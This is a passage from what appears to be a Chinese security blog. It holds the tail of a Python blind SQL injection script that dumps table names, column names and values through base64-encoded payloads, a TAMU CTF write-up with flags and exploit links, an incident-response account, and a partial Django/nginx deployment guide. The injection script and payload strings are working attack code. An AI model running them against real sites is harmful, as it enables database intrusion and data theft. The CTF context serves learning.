class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'[*]已无其他表！'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    print(<span class="hljs-string">'[+]正在爆破表'</span>, str(table_num))</span><br><span class="line">    table = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> str_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">        <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line">        test2 = sql.format(table_num - <span class="hljs-number">1</span>, str_num, <span class="hljs-number">1</span>)</span><br><span class="line">        sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">            print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">            print(<span class="hljs-string">'[*]table: '</span>, table)</span><br><span class="line">            tables_name[table_num] = table</span><br><span class="line">            print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        table = fuzz(sql, test, table_num, str_num, table)</span><br><span class="line">        print(<span class="hljs-string">'[+]table: '</span>, table)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'******************'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> tables_name:</span><br><span class="line">    print(<span class="hljs-string">'[*]table'</span> + str(key) + <span class="hljs-string">': '</span> + tables_name[key])</span><br><span class="line">print(<span class="hljs-string">'******************\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tb = int(input(<span class="hljs-string">'&gt;请选择需要爆破的表(数字)：'</span>))</span><br><span class="line"><span class="hljs-comment"># for tb in tables_name:</span></span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr((select column_name from information_schema.columns where table_name='"</span> + tables_name[tb]+ <span class="hljs-string">"' limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;2&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr((select column_name from information_schema.columns where table_name='"</span> + tables_name[tb]+ <span class="hljs-string">"' limit &#123;0&#125;,1),&#123;1&#125;,1)))=&#123;2&#125; -- +"</span></span><br><span class="line">colunms_name = &#123;&#125;</span><br><span class="line"><span class="hljs-keyword">for</span> column_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):</span><br><span class="line">    sqli = sql.format(column_num - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'[*]已无其他字段！'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    print(<span class="hljs-string">'[+]正在爆破字段'</span>, str(column_num))</span><br><span class="line">    column = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> str_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">        <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line">        test2 = sql.format(column_num - <span class="hljs-number">1</span>, str_num, <span class="hljs-number">1</span>)</span><br><span class="line">        sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">            print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">            print(<span class="hljs-string">'[*]column: '</span>, column)</span><br><span class="line">            colunms_name[column_num] = column</span><br><span class="line">            print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        column = fuzz(sql, test, column_num, str_num, column)</span><br><span class="line">        print(<span class="hljs-string">'[+]column: '</span>, column)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'******************'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> colunms_name:</span><br><span class="line">    print(<span class="hljs-string">'[*]column'</span> + str(key) + <span class="hljs-string">': '</span> + colunms_name[key])</span><br><span class="line">print(<span class="hljs-string">'******************\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cl = int(input(<span class="hljs-string">'&gt;请选择需要爆破的字段(数字)：'</span>))</span><br><span class="line">sql = <span class="hljs-string">"1' or (ascii(substr(( select "</span> + colunms_name[cl] + <span class="hljs-string">" from "</span> + tables_name[tb]+ <span class="hljs-string">" limit &#123;0&#125;,1),&#123;1&#125;,1)))&gt;&#123;2&#125; -- +"</span></span><br><span class="line">test = <span class="hljs-string">"1' or (ascii(substr(( select "</span> + colunms_name[cl] + <span class="hljs-string">" from "</span> + tables_name[tb]+ <span class="hljs-string">" limit &#123;0&#125;,1),&#123;1&#125;,1)))=&#123;2&#125; -- +"</span></span><br><span class="line">key = []</span><br><span class="line"><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):</span><br><span class="line">    sqli = sql.format(num - <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="line">    sqli = base64.b64encode(sqli.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">    params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">    html = requests.post(url, params)</span><br><span class="line">    r = html.text</span><br><span class="line">    <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">        print(<span class="hljs-string">'[*]已无其他值！'</span>)</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br><span class="line">    print(<span class="hljs-string">'[+]正在爆破第'</span>, str(num))</span><br><span class="line">    tmp_key = <span class="hljs-string">''</span></span><br><span class="line">    <span class="hljs-keyword">for</span> str_num <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">        <span class="hljs-comment"># 测试length(database())，一旦超过长度则不用再执行。</span></span><br><span class="line">        test2 = sql.format(num - <span class="hljs-number">1</span>, str_num, <span class="hljs-number">1</span>)</span><br><span class="line">        sqli = base64.b64encode(test2.encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">        sqli = str(sqli, encoding=<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">        params = &#123;<span class="hljs-string">'spy_name'</span>: sqli&#125;</span><br><span class="line">        html = requests.post(url, params)</span><br><span class="line">        r = html.text</span><br><span class="line">        <span class="hljs-keyword">if</span> len(r) &lt; judge:</span><br><span class="line">            print(<span class="hljs-string">'======================'</span>)</span><br><span class="line">            print(<span class="hljs-string">'[*]key: '</span>, tmp_key)</span><br><span class="line">            key.append(tmp_key)</span><br><span class="line">            print(<span class="hljs-string">'======================\n'</span>)</span><br><span class="line">            <span class="hljs-keyword">break</span></span><br><span class="line"></span><br><span class="line">        tmp_key = fuzz(sql, test, num, str_num, tmp_key)</span><br><span class="line">        print(<span class="hljs-string">'[+]key: '</span>, tmp_key)</span><br><span class="line"></span><br><span class="line">print(<span class="hljs-string">'******************'</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> tt <span class="hljs-keyword">in</span> key:</span><br><span class="line">    print(<span class="hljs-string">'[*]key: '</span> + tt)</span><br><span class="line">print(<span class="hljs-string">'******************\n'</span>)</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;上面的代码还可以优化，比如增加sqlmap中的–dump功能，将所有的表跟字段都爆破出来。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-02-25T16:40:00.000Z">2018-02-26</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 811 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/02/tamu-ctf-writeup/">tamu ctf writeup</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;好像很久没更新blog了，昨天接到任务要做tamu的ctf，所以做完记录一下。</p>
+<h3 id="1、介绍题"><a href="#1、介绍题" class="headerlink" title="1、介绍题"></a>1、介绍题</h3><p>&emsp;&emsp;Flag很明显（gigem{Howdy!}），主要是熟悉flag形式。</p>
+<div align="center"><br>    <img src="/images/posts/tamu/1.png"><br></div>
+
+<h3 id="2、杂项1"><a href="#2、杂项1" class="headerlink" title="2、杂项1"></a>2、杂项1</h3><div align="center"><br>    <img src="/images/posts/tamu/2.png"><br></div><br>&emsp;&emsp;将附件下载后使用binwalk分析文件，可以看到有隐藏文件，再使用foremost分离文件，解压后可以在document.xml里找到flag。这里另一种解题方法就是将这些附件<code>还原</code>成doc或docx。<br><div align="center"><br>    <img src="/images/posts/tamu/3.png"><br></div><br><div align="center"><br>    <img src="/images/posts/tamu/4.png"><br></div><br>&emsp;&emsp;所以flag就是：Flag=ICanRead!（不要自己脑补格式…）<br><br>### 3、杂项2<br><div align="center"><br>    <img src="/images/posts/tamu/5.png"><br></div><br>&emsp;&emsp;按要求登陆，登陆后。<br><div align="center"><br>    <img src="/images/posts/tamu/6.png"><br></div><br>&emsp;&emsp;Tips: 使用ls –a，简单粗暴点。<br><br>### 4、web3<br><div align="center"><br>    <img src="/images/posts/tamu/7.png"><br></div><br>&emsp;&emsp;看到robots就预感跟robots.txt有关，打开网页，google bot。。。<br><div align="center"><br>    <img src="/images/posts/tamu/8.png"><br></div><br><div align="center"><br>    <img src="/images/posts/tamu/9.png"><br></div><br><div align="center"><br>    <img src="/images/posts/tamu/10.png"><br></div><br>&emsp;&emsp;Flag：gigem{craw1ing_bot$!}<br><br>### 5、web4<br><div align="center"><br>    <img src="/images/posts/tamu/11.png"><br></div><br><div align="center"><br>    <img src="/images/posts/tamu/12.png"><br></div><br>&emsp;&emsp;注意标题“SQLi”，明显是一道sql注入题，sqlmap三连后可以得到账号密码。登陆后即可得到flag：gigem{ScRuB7h3InpU7}。<br><div align="center"><br>    <img src="/images/posts/tamu/13.png"><br></div><br><div align="center"><br>    <img src="/images/posts/tamu/14.png"><br></div>
+
+<h3 id="6、Scenario-–-MCCU：01-logs"><a href="#6、Scenario-–-MCCU：01-logs" class="headerlink" title="6、Scenario – MCCU：01_logs"></a>6、Scenario – MCCU：01_logs</h3><p>&emsp;&emsp;这道题连蒙带猜。。。一看题目，先fuzz一波。。</p>
+<div align="center"><br>    <img src="/images/posts/tamu/15.png"><br></div><br>&emsp;&emsp;得到：1：web；2：access.log…<br><br>&emsp;&emsp;因为一般入侵都不太可能一次试探就成功，所以打算在error.log里找IP，这里看完后也就两个IP：172.16.20.134跟172.16.20.24。<br><br>得到：3：172.16.20.24。<br><br>&emsp;&emsp;时间有点难找，所以我先跳过4，先做5。在access.log里把172.16.20.24所访问的页面全找出来，然后在<code>/wp-content/plugins/wpshop/includes/ajax.php</code>发现异常，提交后提示正确，所以时间也就是这次访问的时间。<br><div align="center"><br>    <img src="/images/posts/tamu/16.png"><br></div>
+
+<p>&emsp;&emsp;所以flag：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 1：web；</span><br><span class="line">* 2：access.log；</span><br><span class="line">* 3：172.16.20.24；</span><br><span class="line">* 4： Nov/08-20:32:49；</span><br><span class="line">* 5：/wp-content/plugins/wpshop/includes/ajax.php。</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;注意4的时间格式，这里我交完就忘了要不要将Nov转成11，，，，再次提交又不再验证，，，反正时间是这个。。。</p>
+<p>&emsp;&emsp;后来google了一下，发现是WordPress WPshop - 电子商务1.3.9.5，任意文件上传漏洞，这里mark一下。</p>
+<p><b>Payload:</b></p>
+<ul>
+<li><a href="https://github.com/XiphosResearch/exploits/tree/master/wpsh0pwn" target="_blank" rel="noopener">https://github.com/XiphosResearch/exploits/tree/master/wpsh0pwn</a><br></li>
+<li><a href="http://www.3xploi7.com/2015/12/wordpress-wpshop-ecommerce-1395.html" target="_blank" rel="noopener">http://www.3xploi7.com/2015/12/wordpress-wpshop-ecommerce-1395.html</a></li>
+</ul>
+<h3 id="7、Scenario-–-MCCU：00-intrusion"><a href="#7、Scenario-–-MCCU：00-intrusion" class="headerlink" title="7、Scenario – MCCU：00_intrusion"></a>7、Scenario – MCCU：00_intrusion</h3><p>&emsp;&emsp;Fuzz即可。。。。</p>
+<div align="center"><br>    <img src="/images/posts/tamu/17.png"><br></div>
+
+<h3 id="8、Scenario-–-ClandestineEnforced：01-Phishing"><a href="#8、Scenario-–-ClandestineEnforced：01-Phishing" class="headerlink" title="8、Scenario – ClandestineEnforced：01_Phishing"></a>8、Scenario – ClandestineEnforced：01_Phishing</h3><p>&emsp;&emsp;题目的意思是找出钓鱼邮件，打开下面三个邮件，1，2很明显就是钓鱼邮件，所以flag：1,2，直接提交即可。</p>
+<div align="center"><br>    <img src="/images/posts/tamu/18.png"><br></div>
+
+<h3 id="9、web1"><a href="#9、web1" class="headerlink" title="9、web1"></a>9、web1</h3><p>&emsp;&emsp;这道题为自己蠢哭。。。。都说reading了，，，就是脑子抽风了不知道咋整，还好解了其他题，脑子回来了。。。</p>
+<div align="center"><br>    <img src="/images/posts/tamu/19.png"><br></div><br>&emsp;&emsp;慢慢reading，，，终于在某一行找到了flag。。。。<br><div align="center"><br>    <img src="/images/posts/tamu/20.png"><br></div><br>&emsp;&emsp;所以flag：gigem{F!nD_a_F!AG!}<br><br>### 10、web2<br><div align="center"><br>    <img src="/images/posts/tamu/21.png"><br></div><br><div align="center"><br>    <img src="/images/posts/tamu/22.png"><br></div><br>&emsp;&emsp;打开burp suite，把两个按钮的包抓一下，<br><div align="center"><br>    <img src="/images/posts/tamu/23.png"><br></div><br>&emsp;&emsp;把veggie base64解码一下，可以发现有东西。<br><div align="center"><br>    <img src="/images/posts/tamu/24.png"><br></div><br>&emsp;&emsp;再看看第二个包，<br><div align="center"><br>    <img src="/images/posts/tamu/25.png"><br></div><br>&emsp;&emsp;再把cookie的值base64解码一下。<br><div align="center"><br>    <img src="/images/posts/tamu/26.png"><br></div><br>&emsp;&emsp;所以flag：gigem{CrAzzYY_4_CO0k!es}<br><br>### 11、Scenario – NotSoAwesomeInc：00_intrusion<br>&emsp;&emsp;将附件下载后认真找就能找到答案。<br><div align="center"><br>    <img src="/images/posts/tamu/27.png"><br></div>
+
+
+
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-01-22T16:40:00.000Z">2018-01-23</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    7 分钟 读完 (大约 1037 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/01/hackta-yingji/">记黑塔的一次应急响应</a>
+            
+        </h1>
+        <div class="content">
+            <h3 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h3><p>&emsp;&emsp;今天下午15时左右，跟往常一样登陆后台查看信息，在输入账号密码后居然发现提示<code>账号密码不正确</code>！第一次以为自己输入错误，但接连输入几次后发现都是错误，心里顿时毛骨悚然，mmp的，难道那么快就被hack掉了？？赶紧远程服务器！！</p>
+<h3 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h3><p>&emsp;&emsp;在登陆服务器后第一件事就是<code>history</code>判断服务器是否被<code>get shell</code>，然而却发现并没有可疑的操作，当然也有可能被擦除掉，但我相信这个可能性比较低。由于不清楚危险等级，所以只能把web服务先关闭，换成正在升级的公告，这也是为了避免不必要的影响。</p>
+<p>&emsp;&emsp;关闭服务器后，马上查看运行日志，第一顺序就是判断后台是否沦陷，使用正则提取<code>POST/GET</code>到后台地址的记录，发现条数并不是很多，而且查看今天操作的时间也跟自己操作的时间重合，昨天只有三条记录，看着这心里顿时松了口气，由此可见后台地址的重要性，这也是用户数据的最后一颗稻草。</p>
+<p>&emsp;&emsp;然后查看一下日志的记录大小，没把我吓一跳，39W+的记录，我就是对黑塔项目再自信也不认为两三天内能产生那么多<code>正常</code>的访问记录。</p>
+<p><div align="center"><br>    <img src="/images/posts/hackta/1.png"><br></div><br>&emsp;&emsp;接着为了分析日志方便，我把几十兆的日志文件从服务器上拉了下来，欣慰的是下载速度能达到2M左右，所以也没耽误什么时间。用UE打开后，随便一拉就发现了某用户（这里之所以说某是因为后面通过日志发现了他）在激活页面疯狂提交重置<code>admin</code>密码的验证码，好家伙，足足爆破了3个小时左右，接近10W条记录。</p>
+<p><div align="center"><br>    <img src="/images/posts/hackta/2.jpg"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/hackta/3.png"><br></div><br>&emsp;&emsp;为了更清晰的还原他的操作，继续分析日志，此时重点就在爆破前和爆破后的日志记录了，先翻到爆破前，发现此用户尝试注册<code>admin</code>用户，但提示用户存在，注册失败！接着根据日志，他跑到了重置密码页面，一开始使用<code>admin + 他的邮箱</code>重置密码，但这肯定不行。这时，他灵光一闪【奸笑】，想到了他注册时给他发送邮件的邮箱，这也正是<code>admin</code>的邮箱！！然后，他再使用重置密码，但激活码发送到了<code>admin</code>的邮箱，这才出现了39W+的爆破记录，很明显，这将<code>无疾而终</code>。但他成功的把<code>admin</code>的账号给冻结了，导致一开始出现的<code>admin</code>用户无法登陆现象。</p>
+<h3 id="总结和修复方案"><a href="#总结和修复方案" class="headerlink" title="总结和修复方案"></a>总结和修复方案</h3><p>&emsp;&emsp;可以看到，整件事的产生都是因为<code>admin</code>信息的泄漏，而<code>admin</code>及其邮箱都是本地开发时使用的调试信息，在上线前，作者对系统中用户可控的各个输入点都进行了严密的过滤，但却没能防止敏感信息泄漏。所以，在以后的开发中，一定要<code>注意调试环境跟生产环境间敏感信息的保护</code>，像拿到调试环境所泄漏的敏感信息从而攻克整个生产系统的案例并不少见，如默认用户、test用户等。</p>
+<p>&emsp;&emsp;修复方案：</p>
+<ul>
+<li>删除默认管理员账号，禁用诸如<code>admin</code>、<code>root</code>用户名作为管理员账号；</li>
+<li>对提交页面做次数限制，防止恶意爆破，就算不能爆破成功也要减少系统开销；</li>
+</ul>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2018-01-17T18:00:00.000Z">2018-01-18</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    13 分钟 读完 (大约 1951 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2018/01/django-nginx-uwsgi/">部署Django项目</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;月初一直在忙于期末复习准备考试，导致博客处于断更状态，考完试后就忙于为“黑塔”项目增加爬虫，并将项目正式部署该项目。现在已经完成了初步的部署，所以是时候更新博客和记录部署时遇到的一些问题。其实，开个博客也是能很好的鞭策自己去学习东西，就是为了博客不处于断更状态。</p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#1">一：部署概述</a></li>
+<li><a href="#2">二：收集项目中的静态文件</a></li>
+<li><a href="#3">三：安装及配置uwsgi</a></li>
+<li><a href="#4">四：安装及配置nginx</a></li>
+<li><a href="#5">五：启动服务</a></li>
+<li><a href="#6">六：部署中遇到的问题及解决方案</a></li>
+</ul>
+<h3 id="部署概述"><a href="#部署概述" class="headerlink" title="部署概述"></a><a name="1"></a>部署概述</h3><p>&emsp;&emsp;在本文中采用<code>nginx + uwsgi</code>的部署方案，这也是目前较为受欢迎的方案。先放一张整个系统的架构图：</p>
+<div align="center"><br>    <img src="/images/posts/other/12.png"><br></div>
+
+<p>&emsp;&emsp;在这个方案中，nginx主要处理静态页面，而uwsgi处理动态页面，整个系统对外体现为nginx，当nginx发现请求的是动态页面时会将请求发送给uwsgi处理，这两者之间的通信桥梁可以是端口或者sock的形式，本文采用sock文件的形式，听说这种方式比端口通信更加有效。</p>
+<h3 id="收集项目中的静态文件"><a href="#收集项目中的静态文件" class="headerlink" title="收集项目中的静态文件"></a><a name="2"></a>收集项目中的静态文件</h3><p>&emsp;&emsp;很多博客里都把这一步放到最后，但这给刚学部署的人很不好的体验，使人对整个部署过程很模糊，所以我这里先收集项目中的静态文件。说明：静态文件的位置<code>没有要求</code>，收集静态文件的目的是让nginx更好的处理它，如果直接使用APP里的静态文件会<code>导致</code>后台Admin的css、js等<code>无法加载</code>，所以我们需要先收集静态文件。</p>
+<p>&emsp;&emsp;在项目的<code>setting.py</code>中添加静态文件存放的目录，添加内容如下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STATIC_URL = <span class="hljs-string">'/static/'</span></span><br><span class="line"><span class="hljs-comment"># STATIC_ROOT就是静态文件的路径，可以自由设置，下面配置uwsgi、nginx需要使用到这个路径</span></span><br><span class="line">STATIC_ROOT = <span class="hljs-string">'/root/django/static/'</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;在<code>manage.py</code>的目录下运行<code>python manage.py collectstatic</code>收集静态文件。</p>
+<h3 id="安装及配置uwsgi"><a href="#安装及配置uwsgi" class="headerlink" title="安装及配置uwsgi"></a><a name="3"></a>安装及配置uwsgi</h3><p>&emsp;&emsp;在django的python环境中执行：<code>pip install uwsgi</code>即可。</p>
+<p>&emsp;&emsp;配置uwsgi，本文采用.ini的文件形式配置。新建一个新的文件夹，可以在任意位置。如本文中在与django项目同级的目录下新建一个名为：uwsgi的文件夹，名字可以任意取。</p>
+<p><div align="center"><br>    <img src="/images/posts/other/13.png"><br></div><br>&emsp;&emsp;其中<code>web</code>是项目文件夹，<code>uwsgi</code>文件夹用来存放uwsgi的配置文件和日志等。</p>
+<p>&emsp;&emsp;在uwsgi中新建一个<code>uwsgi.ini</code>的文件，具体内容如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> uwsig使用配置文件启动</span></span><br><span class="line">[uwsgi]</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 项目根目录，并非是app目录</span></span><br><span class="line">chdir=/root/django/web/</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> wsgi.py的路径，first是wsgi.py存在的目录名</span></span><br><span class="line">module=first.wsgi:application</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 指定sock的文件路径，用来与nginx通信       </span></span><br><span class="line">socket=/root/django/uwsgi/uwsgi.sock</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 进程个数       </span></span><br><span class="line">workers=4</span><br><span class="line">pidfile=/root/django/uwsgi/uwsgi.pid</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 指定IP端口，这里可以用来测试uwsgi与django项目之间是否准确连接。调试好后可以注释掉</span></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 如果开启了可以不用开启nginx服务而直接通过 ip:8080访问网页。       </span></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> http=192.168.2.108:8080</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 这里使用上面收集的静态文件夹目录</span></span><br><span class="line">static-map=/static=/root/django/static</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 启动uwsgi的用户名和用户组</span></span><br><span class="line">uid=junay</span><br><span class="line">gid=root</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 启用主进程</span></span><br><span class="line">master=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 自动移除unix Socket和pid文件当服务停止的时候</span></span><br><span class="line">vacuum=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 序列化接受的内容，如果可能的话</span></span><br><span class="line">thunder-lock=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 启用线程</span></span><br><span class="line">enable-threads=true</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 设置自中断时间</span></span><br><span class="line">harakiri=30</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 设置缓冲</span></span><br><span class="line">post-buffering=4096</span><br><span class="line"><span class="hljs-meta">#</span><span class="hljs-bash"> 设置日志目录</span></span><br><span class="line">daemonize=/root/django/uwsgi/uwsgi.log</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;上面配置文件的每一条都有详细的说明，请大家仔细阅读。这里需要注意的是，我为这个项目专门添加了一个<code>junay</code>的用户，并且将它添加到<code>root</code>用户组。后面我还是使用这个用户开启nginx服务。我们需要特别注意用户权限的问题，这个问题也困扰了我两天。</p>
+<h3 id="安装及配置nginx"><a href="#安装及配置nginx" class="headerlink" title="安装及配置nginx"></a><a name="4"></a>安装及配置nginx</h3><p>&emsp;&emsp;nginx直接使用apt安装即可。安装完成后我们在<code>/etc/nginx/conf.d/</code>目录下为nginx与uwsgi通信建立配置文件。文件名可以任意，内容如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">    # nginx服务开启的端口</span><br><span class="line">    listen 80; </span><br><span class="line">    # 如果有域名则写上域名，否则使用IP地址</span><br><span class="line">    server_name www.secsearch.top; </span><br><span class="line">    # Nginx日志配置</span><br><span class="line">    access_log /var/log/nginx/access.log; </span><br><span class="line">    charset utf-8; # 